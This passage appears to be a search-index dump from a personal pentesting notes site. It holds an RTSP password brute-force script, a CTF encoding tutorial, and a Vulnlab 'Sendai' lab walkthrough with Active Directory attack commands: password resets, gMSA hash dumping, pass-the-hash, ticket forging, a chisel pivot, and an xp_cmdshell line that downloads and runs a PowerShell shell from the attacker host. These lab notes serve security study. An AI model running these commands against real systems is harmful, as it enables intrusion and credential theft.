class=\"c1\"\u003e# Listing a shared folder\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ersync -av --list-only rsync://192.168.0.123/shared_name\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Copying files from a shared folder\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ersync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e","tags":[],"title":"Rsync"},{"content":" Scan : curl -i -X OPTIONS rtsp://77.238.150.161:554/stream1 RTSP/1.1\rBrute force : import subprocess with open(\u0026#39;rockyou.txt\u0026#39;, \u0026#39;r\u0026#39;) as fichier: for ligne in fichier: mot_de_passe = ligne.strip() commande_curl = f\u0026#39;curl -i -X OPTIONS \u0026#34;rtsp://admin:{mot_de_passe}@10.189.52.215:5000/\u0026#34;\u0026#39; # Exécute la commande curl et capture la sortie response = subprocess.run(commande_curl, shell=True, capture_output=True, text=True) # Vérifie si \u0026#34;202\u0026#34; est dans la réponse if \u0026#34;202\u0026#34; in response.stdout: print(\u0026#34;Mot de passe trouvé:\u0026#34;, mot_de_passe) break else: print(\u0026#34;loading\u0026#34;)\r","date":"2023-09-07","id":97,"permalink":"/notes/services/rtsp/","summary":"\u003cul\u003e\n\u003cli\u003eScan :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecurl -i -X OPTIONS rtsp://77.238.150.161:554/stream1 RTSP/1.1\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eBrute force :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003esubprocess\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003ewith\u003c/span\u003e \u003cspan class=\"nb\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;rockyou.txt\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;r\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003eas\u003c/span\u003e \u003cspan class=\"n\"\u003efichier\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003eligne\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003efichier\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003emot_de_passe\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eligne\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003estrip\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003ecommande_curl\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"sa\"\u003ef\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;curl -i -X OPTIONS \u0026#34;rtsp://admin:\u003c/span\u003e\u003cspan class=\"si\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003emot_de_passe\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s1\"\u003e@10.189.52.215:5000/\u0026#34;\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"c1\"\u003e# Exécute la commande curl et capture la sortie\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003eresponse\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esubprocess\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erun\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ecommande_curl\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eshell\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ecapture_output\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003etext\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"c1\"\u003e# Vérifie si \u0026#34;202\u0026#34; est dans la réponse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;202\u0026#34;\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003eresponse\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003estdout\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nb\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Mot de passe trouvé:\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003emot_de_passe\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eelse\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nb\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;loading\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e","tags":[],"title":"RTSP"},{"content":"","date":"2023-09-07","id":98,"permalink":"/notes/code/ruby/","summary":"","tags":[],"title":"Ruby"},{"content":"Introduction to Encoding and Cryptography in Python ASCII Encoding In Python, the chr() function can be used to convert an ASCII ordinal number to a character (the ord() function does the opposite).\nASCII, or American Standard Code for Information Interchange, is a 7-bit encoding standard used to represent text using integers from 0 to 127.\nascii_numbers = [99, 114, 121, 112, 116, 111, 123, 65, 83, 67, 73, 73, 95, 112, 114, 49, 110, 116, 52, 98, 108, 51, 125] flag = \u0026#39;\u0026#39;.join([chr(num) for num in ascii_numbers]) print(flag)\rHexadecimal Encoding In Python, the bytes.fromhex() function can be used to convert hex to bytes. The .hex() instance method can be called on byte strings to get the hex representation.\nHexadecimal is a way to represent ASCII strings. Each letter is converted to an ordinal number, and then to base-16 (hexadecimal). The numbers are combined into a long hexadecimal string.\nhex_string = \u0026#34;63727970746f7b596f755f77696c6c5f62655f776f726k696n675f776974685f6865785f737472696n67735f615f6c6o747d\u0026#34; flag = bytes.fromhex(hex_string).decode(\u0026#39;utf-8\u0026#39;) print(flag) ) Convert hexadecimal to decimal\nvar=\u0026#34;0xc\u0026#34; print(int(var,16))\rBase64 Encoding Python, after importing the base64 module with import base64, you can use the base64.b64encode() function. Remember to decode the hex first as the challenge description states.\nBase64 encoding represents binary data as an ASCII string. It uses an alphabet of 64 characters, with each character encoding 6 bits of binary data. Four Base64 characters represent three 8-bit bytes.\nimport base64 hex_string = \u0026#34;72bca9b68fc16ac7beeb8f849dca1d8a783e8acf9679bf9269f7bf\u0026#34; bytes_data = bytes.fromhex(hex_string) base64_encoded = base64.b64encode(bytes_data).decode(\u0026#39;utf-8\u0026#39;) print(base64_encoded) Another example to decode base64 strings :\nimport base64 var = b\u0026#39;anMvbXlmaWxlLnR4dA==\u0026#39; flag_bytes = base64.b64decode(var) flag = flag_bytes.decode(\u0026#39;utf-8\u0026#39;) print(flag)\rConverting Messages into Numbers Python\u0026rsquo;s PyCryptodome library implements this with the methods bytes_to_long() and long_to_bytes(). You will first have to install PyCryptodome and import it with from Crypto.Util.number import *\nTo perform mathematical operations on messages, they need to be converted into numbers. One common method is to take the ordinal bytes of a message, convert them to hexadecimal, and concatenate them.\nmessage = \u0026#34;HELLO\u0026#34; ascii_bytes = [72, 69, 76, 76, 79] hex_bytes = [hex(byte) for byte in ascii_bytes] hex_string = \u0026#39;\u0026#39;.join(hex_bytes) decimal_number = int(hex_string, 16) print(hex_string) print(decimal_number)\rXOR Operation and Its Properties XOR (Exclusive OR) is a bitwise operator that returns 0 if the bits are the same and 1 if they are different. It\u0026rsquo;s often represented by the caret (^) symbol.\nXOR Properties:\nA B Output 0 0 0 0 1 1 1 0 1 1 1 0 Commutative: A ⊕ B = B ⊕ A Associative: A ⊕ (B ⊕ C) = (A ⊕ B) ⊕ C Identity: A ⊕ 0 = A Self-Inverse: A ⊕ A = 0 In Python, you can use XOR to encrypt and decrypt data, and these properties are essential for understanding how XOR-based encryption works.\nHere\u0026rsquo;s a practical example:\n#XORing each character of the string \u0026#34;crypto\u0026#34; with the integer 13 from pwn import * word=\u0026#34;73626960647f6b206821204f21254f7d694f7624662065622127234f726927756d\u0026#34; binary = bytes.fromhex(word) i=0 while i\u0026lt;100 : xored_label = \u0026#39;\u0026#39;.join([ chr(ord(xor(char , i ))) for char in binary]) flag = xored_label if (\u0026#34;crypto\u0026#34; in flag): break else: i=i+1 print(flag)\r","date":"2023-09-07","id":99,"permalink":"/notes/crypto/scripting/","summary":"\u003ch2 id=\"introduction-to-encoding-and-cryptography-in-python\"\u003eIntroduction to Encoding and Cryptography in Python\u003c/h2\u003e\n\u003ch3 id=\"ascii-encoding\"\u003eASCII Encoding\u003c/h3\u003e\n\u003cp\u003eIn Python, the \u003ccode\u003echr()\u003c/code\u003e function can be used to convert an ASCII ordinal number to a character (the \u003ccode\u003eord()\u003c/code\u003e function does the opposite).\u003c/p\u003e","tags":[],"title":"Scripting"},{"content":"Scan :\nPORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: IIS Windows Server 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-08-02 22:57:13Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=dc.sendai.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.sendai.vl | Not valid before: 2024-08-02T22:43:16 |_Not valid after: 2025-08-02T22:43:16 443/tcp open ssl/http Microsoft IIS httpd 10.0 | ssl-cert: Subject: commonName=dc.sendai.vl | Subject Alternative Name: DNS:dc.sendai.vl | Not valid before: 2023-07-18T12:39:21 |_Not valid after: 2024-07-18T00:00:00 |_http-server-header: Microsoft-IIS/10.0 |_ssl-date: TLS randomness does not represent time | http-methods: |_ Potentially risky methods: TRACE |_http-title: IIS Windows Server 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=dc.sendai.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.sendai.vl | Not valid before: 2024-08-02T22:43:16 |_Not valid after: 2025-08-02T22:43:16 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=dc.sendai.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.sendai.vl | Not valid before: 2024-08-02T22:43:16 |_Not valid after: 2025-08-02T22:43:16 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=dc.sendai.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.sendai.vl | Not valid before: 2024-08-02T22:43:16 |_Not valid after: 2025-08-02T22:43:16 3389/tcp open ms-wbt-server Microsoft Terminal Services |_ssl-date: 2024-08-02T22:58:32+00:00; -1s from scanner time. | ssl-cert: Subject: commonName=dc.sendai.vl | Not valid before: 2024-08-01T22:52:14 |_Not valid after: 2025-01-31T22:52:14 | rdp-ntlm-info: | Target_Name: SENDAI | NetBIOS_Domain_Name: SENDAI | NetBIOS_Computer_Name: DC | DNS_Domain_Name: sendai.vl | DNS_Computer_Name: dc.sendai.vl | DNS_Tree_Name: sendai.vl | Product_Version: 10.0.20348 |_ System_Time: 2024-08-02T22:57:52+00:00 Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-08-02T22:57:56 |_ start_date: N/A | smb2-security-mode: | 311: |_ Message signing enabled and required\rEnum Username :\nnxc smb $t -u Guest -p \u0026#39;\u0026#39; --rid-brute\rsqlsvc websvc Dorothy.Jones Kerry.Robinson Naomi.Gardner Anthony.Smithcat Susan.Harper Stephen.Simpson Marie.Gallagher Kathleen.Kelly Norman.Baxter Jason.Brady Elliot.Yates Malcolm.Smith Lisa.Williams Ross.Sullivan Clifford.Davey Declan.Jenkins Lawrence.Grant Leslie.Johnson Megan.Edwards Thomas.Powell mgtsvc$ netexec smb $t -u users.txt -p \u0026#34;\u0026#34; --no-bruteforce --continue-on-success\rsmbpasswd.py -newpass \u0026#39;123Pentest_123\u0026#39; \u0026#34;sendai.vl\u0026#34;/\u0026#34;Thomas.Powell\u0026#34;:\u0026#39;\u0026#39;@$t =============================================================================== Warning: This functionality will be deprecated in the next Impacket version =============================================================================== Current SMB password: [!] Password is expired, trying to bind with a null session. [*] Password was changed successfully.\rcat .sqlconfig Server=dc.sendai.vl,1433;Database=prod;User Id=sqlsvc;Password=SurenessBlob85;#\rbloodyAD --host \u0026#34;$t\u0026#34; -d \u0026#34;sendai.vl\u0026#34; -u \u0026#34;Thomas.Powell\u0026#34; -p \u0026#34;123Pentest_123\u0026#34; add groupMember admsvc Thomas.Powell [+] Thomas.Powell added to admsvc\rgMSADumper.py -u \u0026#39;Thomas.Powell\u0026#39; -p \u0026#39;123Pentest_123\u0026#39; -d \u0026#39;sendai.vl\u0026#39; Users or groups who can read password for mgtsvc$: \u0026gt; admsvc mgtsvc$:::3157ca48ba7575a2a501729af5eda7c4 mgtsvc$:aes256-cts-hmac-sha1-96:e5690ba2941be7e5f3f33def770b257adb3e4f2a092cdcedfff72fc3c4fed2e8 mgtsvc$:aes128-cts-hmac-sha1-96:55d896e1da9bc6aba65db6ec43d1dc1e\revil-winrm -i $t -u \u0026#34;mgtsvc$\u0026#34; -H \u0026#34;3157ca48ba7575a2a501729af5eda7c4\u0026#34;\rUser VL{e015461ca5ecaeb714cb231fd719be62}\nPivot:\n# On your local machine ./chisel server -p 8888 -reverse\r# On the remote host ./chisel client 10.8.3.12:8888 R:1080:socks \u0026amp; ./chisel.exe client 10.8.3.12:8888 R:1080:socks proxychains -q nmap -sT localhost\rticketer.py -nthash 58655C0B90B2492F84FB46FA78C2D96A -domain-sid S-1-5-21-3085872742-570972823-736764132-1104 -domain sendai.vl -dc-ip dc.sendai.vl -spn MSSQL/dc.sendai.vl administrator\rexport KRB5CCNAME=MSSQLSvc.breachdc.breach.vl:1433.ccach mssqlclient.py -k breachdc.breach.vl -no-pass -debug\rEXEC xp_cmdshell \u0026#39;powershell -Command \u0026#34;\u0026amp; {IEX (New-Object Net.WebClient).DownloadString(\u0026#39;\u0026#39;http://10.8.3.12:8080/shell.ps1\u0026#39;\u0026#39;)}\u0026#34;\u0026#39;;\rPrivesc with seimpersonate Root VL{ae138bcfb077995339a717a28a23fd61}\n","date":"2023-09-07","id":100,"permalink":"/notes/lab/vulnlab/sendai/","summary":"\u003cp\u003eScan :\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT     STATE SERVICE       VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e53/tcp   open  domain        Simple DNS Plus\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e80/tcp   open  http          Microsoft IIS httpd 10.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e http-methods:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  Potentially risky methods: TRACE\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-server-header: Microsoft-IIS/10.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-title: IIS Windows Server\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e88/tcp   open  kerberos-sec  Microsoft Windows Kerberos \u003cspan class=\"o\"\u003e(\u003c/span\u003eserver time: 2024-08-02 22:57:13Z\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e135/tcp  open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e389/tcp  open  ldap          Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: sendai.vl0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: TLS randomness does not represent \u003cspan class=\"nb\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003edc.sendai.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.sendai.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-08-02T22:43:16\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-08-02T22:43:16\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e443/tcp  open  ssl/http      Microsoft IIS httpd 10.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003edc.sendai.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: DNS:dc.sendai.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2023-07-18T12:39:21\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2024-07-18T00:00:00\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-server-header: Microsoft-IIS/10.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: TLS randomness does not represent \u003cspan class=\"nb\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e http-methods:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  Potentially risky methods: TRACE\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-title: IIS Windows Server\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e445/tcp  open  microsoft-ds?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e464/tcp  open  kpasswd5?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: sendai.vl0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: TLS randomness does not represent \u003cspan class=\"nb\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003edc.sendai.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.sendai.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-08-02T22:43:16\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-08-02T22:43:16\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3268/tcp open  ldap          Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: sendai.vl0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: TLS randomness does not represent \u003cspan class=\"nb\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003edc.sendai.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.sendai.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-08-02T22:43:16\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan 